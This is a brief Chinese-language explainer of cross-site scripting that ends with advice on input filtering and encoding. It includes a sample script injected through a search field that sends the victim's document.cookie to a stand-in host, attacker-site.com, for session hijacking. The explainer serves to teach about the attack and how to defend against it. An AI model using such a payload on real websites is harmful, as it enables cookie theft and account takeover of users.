

Cross-site scripting (XSS)是一種web安全漏洞，指攻擊者從一個被信任的網站中插入惡意代碼到一個目標網站中，使其在使用者訪問目標網站時執行該惡意代碼，從而獲取使用者敏感資訊或對其進行其他攻擊。

以下是一個XSS攻擊的例子：

1. 攻擊者獲取一個受害者網站的search欄位，並將JavaScript代碼插入其中：

```
<script>
  alert("Your data has been stolen");
  var xhr = new XMLHttpRequest();
  xhr.open('GET', "http://attacker-site.com/stealData?data=" + document.cookie);
  xhr.send();
</script>
```

2. 當受害者在該網站中輸入查詢並提交時，JavaScript代碼將被執行，該腳本從該網站盜取受害者的cookie資訊並將其發送到攻擊者的網站。

3. 從受害者的cookie，攻擊者可以繞過某些安全措施，例如登錄會話，並以該受害者的名義進行任何活動，例如執行不良交易或更改受害者的個人資訊。

這種類型的攻擊通常發生在web應用程序中，尤其是需要使用者輸入數據的場景，例如搜索、評論或提交表單等。必須採取安全措施，如過濾來自使用者的輸入，將輸入的HTML編碼或JavaScript脫機，以保護Web應用程序免受XSS攻擊。